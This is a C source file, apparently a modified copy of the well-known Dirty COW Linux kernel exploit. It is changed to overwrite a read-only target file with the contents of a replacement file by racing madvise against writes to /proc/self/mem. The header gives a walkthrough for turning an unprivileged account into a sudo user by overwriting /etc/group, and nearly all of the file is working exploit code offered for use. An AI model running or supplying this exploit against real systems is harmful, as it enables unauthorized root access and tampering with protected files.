/*
 * ################### EZdirtyc0w.c ######################
 * A modification to the dirtyC0w.c  program to accept a 
 * replacement file in place of the substitution string. 
 * The original code has been kept complete, including 
 * comments.
 * 
 * FOR EDUCATIONAL PURPOSES ONLY
 *
 * Setup: The following execution sequence will provide sudo access to an 
 * unprivileged user 
 *     sudo
 *     adduser nopriv 
 *     su nopriv
 *     cd ~
 *     cp /etc/group myGroup
 *     vi myGroup 
 *     change: "sudo:root" to "sudo:root,nopriv" and save 
 *     EZdirtyc0w /etc/group ./myGroup
 * 
 * Compile: gcc -pthread EXdirtyc0w.c - EXdirtyc0w.c
 * 
 * USAGE: EZdirtyc0w target_file replacement_file 
 */
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
 */
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>

void *map;
int f;
struct stat st;
char *name;
char *str = NULL;

int fileAsString(char* filename) {
    FILE* fp = NULL;
    struct stat stat;
    size_t bytesread = 0;

    if (filename == NULL) {
        printf("fileAs String requires a valid filename\n");
        return -1;
    }

    printf("Input File: %s\n\n", filename);

    fp = fopen(filename, "r");

    if (fp != NULL) {
        if (fstat(fileno(fp), &stat) == -1) {
            printf("Error obtaining file metadata, code: %i\n", errno);
            return (errno);
        }

        str = (char*) malloc(stat.st_size + 1);
        if (str == NULL) {
            printf("Error out of Memory\n");
            return (-1);
        }

        bytesread = fread(str, sizeof (char), stat.st_size, fp);
        if (bytesread != stat.st_size) {
            printf("Error %i bytes read of %i bytes expected.\n", (int) bytesread, (int) stat.st_size);
            return (-1);
        }

        str[stat.st_size] = '\0';

        printf("%s", str);

        if (fp != NULL) {
            fclose(fp);
        }
    } else {
        printf("Error opening file %s, code: %i\n", filename, errno);
        return (errno);
    }
    return (0);
}

void cleanup() {

    /*
     * Cleanup allocated memory
     */
    if (str != NULL) {
        free(str);
        str = NULL;
    }
}

void *madviseThread(void *arg) {
    char *str;
    str = (char*) arg;
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
        /*
        You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
        > This is achieved by racing the madvise(MADV_DONTNEED) system call
        > while having the page of the executable mmapped in memory.
         */
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg) {
    char *str;
    str = (char*) arg;
    /*
    You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
    >  The in the wild exploit we are aware of doesn't work on Red Hat
    >  Enterprise Linux 5 and 6 out of the box because on one side of
    >  the race it writes to /proc/self/mem, but /proc/self/mem is not
    >  writable on Red Hat Enterprise Linux 5 and 6.
     */
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for (i = 0; i < 100000000; i++) {
        /*
        You have to reset the file pointer to the memory position.
         */
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}

int main(int argc, char *argv[]) {
    /*
    You have to pass two arguments. File and Contents.
     */
    if (argc < 3) {
        (void) fprintf(stderr, "%s\n",
                "usage: EZdirtyc0w target_file replacement_file");
        return 1;
    }
    pthread_t pth1, pth2;

    /*
     Load the replacement_file as a string 
     */
    if (fileAsString(argv[2]) != 0) {
        printf("Error occured while loading the replacement_file as a string\n");
        cleanup();
        return -1;
    }
    /*
    You have to open the file in read only mode.
     */
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];
    /*
    You have to use MAP_PRIVATE for copy-on-write mapping.
    > Create a private copy-on-write mapping.  Updates to the
    > mapping are not visible to other processes mapping the same
    > file, and are not carried through to the underlying file.  It
    > is unspecified whether changes made to the file after the
    > mmap() call are visible in the mapped region.
     */
    /*
    You have to open with PROT_READ.
     */
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n\n", (uintptr_t) map);
    /*
    You have to do it on two threads.
     */
    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, str);
    /*
    You have to wait for the threads to finish.
     */
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    cleanup();
    return 0;
}

